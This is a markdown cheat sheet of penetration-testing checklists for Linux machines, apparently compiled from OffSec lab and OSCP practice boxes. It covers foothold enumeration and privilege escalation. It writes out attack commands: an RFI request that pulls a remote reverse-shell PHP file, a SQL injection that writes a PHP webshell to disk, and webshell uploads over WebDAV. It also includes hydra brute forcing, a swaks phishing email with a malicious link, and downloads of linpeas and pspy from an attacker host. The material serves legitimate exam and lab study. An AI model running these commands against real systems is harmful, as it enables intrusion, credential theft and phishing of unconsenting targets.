---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Linux

{% hint style="info" %}
Based on the following PG Practice, PG Play, and PEN-200 boxes: Amaterasu, Apex, Astronaut, BBScute, BitForge, Blogger, Bratarina, Bullybox, ClamAV, Clue, Cockpit, Exfiltrated, Extplorer, Fanatastic, Fired, Flu, FunboxEasyEnum, Gaara, GlasgowSmile, Hawat, Hetemit, Hunit, LaVita, Levram, Loly, Mantis, Marketing, Mzeeav, Nibbles, Nukem, Payday, PC, Pebbles, Pelican, Peppo, Postfish, Potato, QuackerJack, Readys, Roquefort, Scrutiny, Snookums, Sorcerer, SpiderSociety, SPX, Stapler, Sybaris, Vmdak, Walla, WallpaperHub, Wombo, Workaholic, Xposedapi, Zab, ZenPhoto, Zipper,  Crystal (OSCP A), Aero (OSCP A), Berlin (OSCP B), Kiero (OSCP B),  Frankfurt (OSCP C), and Charlie (OSCP C).
{% endhint %}

## Foothold

<details>

<summary>Port Scan</summary>

The `nmap-scan` script can be found [here](https://github.com/CSpanias/ctf-scripts/tree/main?tab=readme-ov-file#nmap-scansh).

```bash
$ sudo nmap-scan <target-IP>
```

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/web">HTTP(S)</a></summary>

* [ ] [Dirbust](https://x7331.gitbook.io/boxes/web/dirbusting) HTTP(S) ports with a [directory list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt) (plus server-specific extensions) and a [file list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-files.txt)&#x20;

{% code overflow="wrap" %}
```bash
# Dirbust with a directory list
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -ac -c -u http://access/FUZZ -e .aspx,.php,
​


​# Dirbust with a file list
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -ic -ac -c -u http://access/FUZZ
```
{% endcode %}

* [ ] Application-specific PoCs (RCE, LFI, RFI)

{% code overflow="wrap" %}
```bash
# CLI tool
searchsploit <appName> <version>

# Google dork
site:github.com <appName> exploit poc

# RFI revshell
curl --path-as-is -s "http://10.10.10.10:4443/site/index.php?page=http://192.168.45.241:443/revshell_ivan.php" --proxy 127.0.0.1:8080
```
{% endcode %}

* [ ] [File Uploads](https://x7331.gitbook.io/boxes/web/file-uploads)
* [ ] Default/Weak Creds

```bash
uv run creds search <appName>
```

* [ ] BFA

{% code overflow="wrap" %}
```bash
# POST request
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt 'http-post-form://target:8081/login.aspx:username=^USER^&password=^PASS^:F=403'

# POST request (base64-encoded credentials)
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt 'http-post-form://target:8081/login.aspx:username=^USER64^&password=^PASS64^:F=403'
```
{% endcode %}

* [ ] [WebDAV](https://x7331.gitbook.io/boxes/web/webdav)

{% code overflow="wrap" %}
```bash
# Connect to WebDAV
$ cadaver http://x7331
Authentication required for hutch on server 'x7331':
Username: x7331
Password:
# Upload a webshell
dav:/> put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx

# Upload a webshell directly
$ curl -T '/home/kali/shell.aspx' 'http://192.168.64.122/' -u x7331:Pass123!
```
{% endcode %}

* [ ] [Custom wordlists](https://x7331.gitbook.io/boxes/tools/wordlists)

```bash
# Create a userlist based on the site users
username-anarchy -i site_users > anarchy_output

# Create a passlist based on the site content
cewl --write cewl_output http://192.168.202.21/
```

* [ ] [Git repositories](https://x7331.gitbook.io/boxes/web/devops/git-tools)

```bash
# Dump the repository
git-dumper http://target.lab/.git git_repo

# Write all commits to a file
git log | grep commit | cut -d " " -f2 | xargs git show > commits
​
# Open the commits file with VSCode
code commits
```

* [ ] [SQLi](https://x7331.gitbook.io/boxes/web/injections/sqli) (`sqlmap` is allowed for enumeration but not for exploitation)

{% code overflow="wrap" %}
```bash
# Enumeration
sqlmap -r login.req --batch
```
{% endcode %}

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp">Unique Ports</a></summary>



</details>

<details>

<summary><a href="../../services/shares/smb-139-445.md#usage">SMB</a></summary>

* [ ] Known vulnerabilities

```bash
sudo nmap -script=smb-vuln\* -p445 10.10.10.10
```

* [ ] List and enumerate shares

{% code overflow="wrap" %}
```bash
# List shares and permissions
$ uv run nxc smb DC01 -u celia.almeda -p 7k8XHk3dMtmpnC7 --shares

# Download the target share
$ nxc smb MS02 -u x7331 -p Pass123! -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./ MAX_FILE_SIZE=99999999

# Connect and download all files
$ smbclient //target/share -p 12445
Password for [WORKGROUP\x7331]:
Anonymous login successful        
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
{% endcode %}

* [ ] `WRITE` access ([steal hashes](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#hashes))

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp/shares/21-ftp">FTP</a></summary>

* [ ] Anonymous login

{% code overflow="wrap" %}
```bash
# Anonymous login
ftp anonymous@target
ftp ftp@target
```
{% endcode %}

* [ ] BFA

```bash
hydra -l <user> -P <passlist> ftp://<target>
```

* [ ] Enumerate directories

```bash
# Download dir
wget -r ftp://ftp@target_directory
```

* [ ] Upload files

```bash
ftp> put revshell_ivan.php
```

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp/mail/25-587-smtp">SMTP</a>, <a href="https://x7331.gitbook.io/boxes/services/tcp/mail/110-995-pop3">POP3</a></summary>

* [ ] Username enumeration (SMTP)

```bash
smtp-user-enum -M VRFY -U anarchy_output -t 10.10.10.10
```

* [ ] Inbox enumeration (POP3)

```bash
$ telnet 10.10.10.10 110
USER x7331
+OK x7331 is known here.
PASS Pass123!
+OK Welcome! 4 messages (4744 bytes)
LIST
+OK 4 messages, 4744 bytes
1 1342
2 963
3 1347
4 1092
RETR 1
```

* [ ] Phising attachments ([library-ms](https://x7331.gitbook.io/boxes/social-engineering/phising#attachment), [libre-office](https://x7331.gitbook.io/boxes/web/file-uploads/file-types/libreoffice), [pdf](https://x7331.gitbook.io/boxes/web/file-uploads/file-types/pdf)) or malicious links

{% code overflow="wrap" %}
```bash
# Email body with a malicious link
$ cat body.txt
Please lick here to register: http://192.168.45.170/login.html

# Send an email to multiple email addresses
$ swaks --to $(cat emails.txt | tr '\n' ',') --from it@target.off --header "Subject: ERP Registration link" --body @body.txt --server 192.168.161.137 --port 25

# Listener to receive the response
$ sudo nc -lvnp 80
```
{% endcode %}

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp/dbms">Databases</a></summary>

* [ ] [MySQL/MariaDB](https://x7331.gitbook.io/boxes/services/tcp/dbms/sql/3306-mysql-mariadb)

{% code overflow="wrap" %}
```bash
# Connect
mysql -h kali -u x7331 -pPass123! --skip-ssl

# Webshell
'UNION SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/srv/http/webshell.php';-- 
```
{% endcode %}

* [ ] [PostgreSQL](https://x7331.gitbook.io/boxes/services/tcp/dbms/sql/5432-postgresql)

```bash
# Connect
psql -h 127.0.0.1 -p 5437 -U postgresql -W
```

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/udp/161-snmp">SNMP</a></summary>

```bash
# User-related strings
snmpwalk -v2c -c public <target> 1.3.6.1.4.1

# Public strings
snmpwalk -v2c -c public <target>

# Grep for keywords
snmpwalk -v2c -c public <target> | grep -Ei 'user|admin|name|pass|password'

# System-related strings
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1

# Running processes
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2
```

</details>

## Privilege Escalation

<details>

<summary>User Context</summary>

* [ ] [Permissions](https://x7331.gitbook.io/boxes/tl-dr/infra/os/linux/host-recon#users-and-groups), [groups](https://x7331.gitbook.io/boxes/tl-dr/infra/os/linux/privilege-escalation/groups), and shell history

```bash
$ sudo -l


$ id


$ cat /home/<user>/.bash_history

```

</details>

<details>

<summary>Host Enumeration</summary>

* [ ] [Manual Enumeration](https://x7331.gitbook.io/boxes/tl-dr/infra/os/linux/host-recon)

```bash
# Enumerate SUIDs
find / -type f -perm -u=s 2>/dev/null

# Enumerate capabilities
getcap -r / 2>/dev/null

# Local TCP sockets
netstat -anot

# Cronjobs
cat /etc/crontab

# Environment variables
env

# Sudo version
sudo --version

# Kernel version
uname -a
```

* [ ] [LinPEAS](https://x7331.gitbook.io/boxes/tl-dr/infra/infra-tools/pe-scripts#linux)

```bash
$ wget 192.168.45.216:443/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

* [ ] Running processes ([pspy](https://x7331.gitbook.io/boxes/tl-dr/infra/infra-tools/pspy), let it run for at least two minutes)

```bash
$ wget 192.168.45.216:443/pspy64
$ chmod +x pspy64
$ ./pspy64
```

* [ ] Passwords

```bash
grep -rH "password"
```

</details>

<details>

<summary><a href="../../services/shares/smb-139-445.md#usage">SMB</a></summary>

* [ ] List and enumerate shares

{% code overflow="wrap" %}
```bash
# List shares and permissions
uv run nxc smb DC01 -u celia.almeda -p 7k8XHk3dMtmpnC7 --shares

# Download the target share
nxc smb MS02 -u x7331 -p Pass123! -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./ MAX_FILE_SIZE=99999999
```
{% endcode %}

* [ ] `WRITE` access ([steal hashes](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#hashes))

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp/dbms/sql/3306-mysql-mariadb">MySQL/MariaDB</a></summary>

* [ ] Enumerate tables

```bash
mysql -h 127.0.0.1 -u x7331 -pPass123! --skip-ssl
```

</details>
